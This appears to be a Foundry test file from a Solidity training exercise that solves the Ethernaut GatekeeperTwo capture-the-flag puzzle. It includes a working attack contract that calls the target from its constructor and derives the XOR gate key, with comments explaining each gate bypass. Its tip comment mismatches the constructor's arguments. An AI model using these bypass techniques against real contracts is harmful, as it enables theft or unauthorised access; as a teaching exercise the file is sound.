// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

/// @dev Call enter() from the constructor so gateTwo sees extcodesize(caller()) == 0.
contract AttackGatekeeperTwo {
    constructor(GatekeeperTwo _target) {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // During construction: msg.sender != tx.origin and extcodesize == 0.
        // gateThree: key = ~uint64(keccak256(abi.encodePacked(address(this))))
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        _target.enter(gateKey);
        // ========== END ATTACK LOGIC ==========
    }
}

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        target = new GatekeeperTwo();
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   target.entrant() == attacker
        //
        // Three gates:
        //
        // gateOne:
        //   require(msg.sender != tx.origin)
        //   → call enter() through AttackGatekeeperTwo, not as an EOA
        //
        // gateTwo:
        //   require(extcodesize(caller()) == 0)
        //   → call enter() inside the attack contract's constructor
        //
        // gateThree (bytes8 key as uint64):
        //   uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == type(uint64).max
        //   → XOR the attack contract address hash with uint64.max to get the key
        //
        // Tip:
        //   vm.startPrank(attacker, attacker);
        //   new AttackGatekeeperTwo(target, key);
        //   vm.stopPrank();

        // ========== YOUR EXPLOIT HERE ==========
        vm.startPrank(attacker, attacker);
        new AttackGatekeeperTwo(target);
        vm.stopPrank();
        // ========== END EXPLOIT ==========

        assertEq(target.entrant(), attacker, "attacker should be entrant");
    }
}
